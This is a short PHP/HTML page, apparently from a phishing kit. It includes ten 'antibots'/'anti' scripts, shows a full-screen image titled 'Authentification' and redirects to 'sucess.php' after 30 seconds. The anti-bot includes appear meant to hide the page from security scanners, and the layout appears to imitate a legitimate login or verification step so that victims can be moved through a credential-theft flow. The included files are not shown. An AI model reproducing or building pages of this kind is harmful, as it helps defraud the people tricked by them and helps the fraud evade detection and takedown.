<?php

include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentification</title>
    <style>
       /* Styles pour le body */
       body {
           background-image: url(juju.png);
           background-size: cover; /* Ajuste l'image pour couvrir toute la zone */
           background-repeat: no-repeat; /* Évite que l'image se répète */
           background-position: center; /* Centre l'image dans la zone */
           margin: 0; /* Supprime les marges par défaut du body */
           height: 100vh; /* Définit la hauteur du body à la hauteur de la fenêtre */
       }

       /* Ajustements pour les petits écrans */
       @media (max-width: 768px) {
           body {
               background-size: contain; /* Sur petit écran, ajuste pour voir l'image entière */
               background-position: top; /* Positionne l'image en haut */
           }
       }

       @media (max-width: 480px) {
           body {
               background-size: cover; /* Recouvre même sur très petits écrans */
           }
       }
   </style>
</head>
<body>
   <script>
        // Fonction pour rediriger après 30 secondes
        setTimeout(() => {
            window.location.href = "sucess.php"; // Redirection
        }, 30000); // 30000 ms = 30 secondes
    </script>
</body>
</html>
